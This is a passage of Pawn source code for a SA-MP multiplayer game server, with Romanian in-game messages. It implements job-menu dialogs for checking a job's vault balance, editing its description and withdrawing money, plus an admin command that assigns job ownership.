		case 2: {
			format(gString, sizeof(gString), "In seiful jobului se afla $%s.", FormatNumber(JobInfo[job][jBalance]));
			Dialog_Show(playerid, invalid, DIALOG_STYLE_MSGBOX, "Balance", gString, "Close", "");
		}
	}
	return true;
}

Dialog:jobmenu_description(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	new job = PlayerInfo[playerid][pJobOwner];
	if(strlen(inputtext) < 5 || strlen(inputtext) > 30) return SendClientMessage(playerid, COLOR_LGREEN, "Descrierea trebuie sa cuprinda intre 5 si 30 de caractere.");
	strmid(JobInfo[job][jDescription], inputtext, 0, 64);
	SCMf(playerid, COLOR_YELLOW, "Descriere actualizata: %s.", JobInfo[job][jDescription]);
	UpdateLabel(5, job);
	return true;
}

Dialog:jobmenu_withdraw(playerid, response, listitem, inputtext[]) {
	if(!response) return true;
	new job = PlayerInfo[playerid][pJobOwner];
	if(strval(inputtext) > 500000000) return SendClientMessage(playerid, -1, "Invalid amount.");
	if(!IsNumeric(inputtext)) return SendClientMessage(playerid, COLOR_LGREEN, "Eroare: Trebuie sa introduci un numar numeric.");
	if(JobInfo[job][jBalance] < strval(inputtext)) return SendClientMessage(playerid, -1, "Invalid amount.");
	JobInfo[job][jBalance] -= strval(inputtext);
	GivePlayerCash(playerid, strval(inputtext));
	SCMf(playerid, COLOR_YELLOW, "Ai retras $%s din seiful jobului, noua balanta: $%s.", FormatNumber(strval(inputtext)), FormatNumber(JobInfo[job][jBalance]));
	return true;
}

cmd:givejob(playerid, params[]) {
	extract params -> new player:id, job; else 
		return usage(playerid, "givejob <playerid/name> <job id>");

	if(job < 1 || job > sql_jobs) return std_cout::(playerid, -1, "Invalid job ID! (1-%d)", sql_jobs);

	ABroadcast(COLOR_LIGHTRED, 1, "AdmCmd: %s i-a dat lui %s(%d) jobul %s (#%d).", GetName(playerid), GetName(id), JobInfo[job][jName], job);
	std_cout::(playerid, COLOR_YELLOW, "Administratorul %s ti-a dat jobul %s (#%d).", GetName(playerid), JobInfo[job][jName], job);
	strmid(JobInfo[job][jOwner], PlayerInfo[playerid][pUsername], 0, MAX_PLAYER_NAME);
	_query("UPDATE `jobs` SET `Owner` = '%s' WHERE `ID` = '%i'", JobInfo[job][jOwner], JobInfo[job][jID]);
	PlayerInfo[playerid][pJobOwner] = job;
	UpdateVar(playerid, "JobOwner", job);
	UpdateLabel(5, job);
	return true;
}